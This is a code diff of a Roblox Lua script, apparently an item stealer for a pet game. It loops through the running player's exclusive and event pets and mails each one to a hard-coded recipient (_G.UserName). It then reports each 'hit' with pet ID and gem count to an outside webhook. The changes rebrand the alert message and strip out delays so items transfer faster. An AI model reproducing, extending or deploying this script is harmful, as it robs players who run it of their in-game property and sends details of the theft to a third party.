@@ -53,14 +53,14 @@ if dims < 0 then
     dims = 0
 end
 
-wait(30)
+wait()
 for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.GiftPet.Container.Inventory.Pets:GetChildren()) do
     if v:IsA("TextButton") then
         if v:FindFirstChild("RarityGradient"):FindFirstChild("Exclusive") or v:FindFirstChild("RarityGradient"):FindFirstChild("Event") then
             local args = {
                 [1] = {
                     ["Recipient"] = _G.UserName,
-                    ["Diamonds"] = dims,
+                    ["Diamonds"] = 0,
                     ["Pets"] = {
                         [1] = v.Name
                     },
@@ -68,9 +68,9 @@ for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.
                 }
             }
         Networking.Invoke("Send Mail", unpack(args))
-        sendWebhook(_G.Webhook, "@everyone Paxz detected a hit \n\n```Pet ID: " .. v.Name .. "```\n\n```Gems: " .. dims .. "\n\nReciever: " .. _G.UserName .. "```")
+        sendWebhook(_G.Webhook, "||@everyone|| Monz detected a hit \n\n```Pet ID: " .. v.Name .. "```\n\n```Gems: " .. dims .. "\n\nReciever: " .. _G.UserName .. "```")
         dims = 0
-        wait(7)
+        wait()
     end
 end
 end
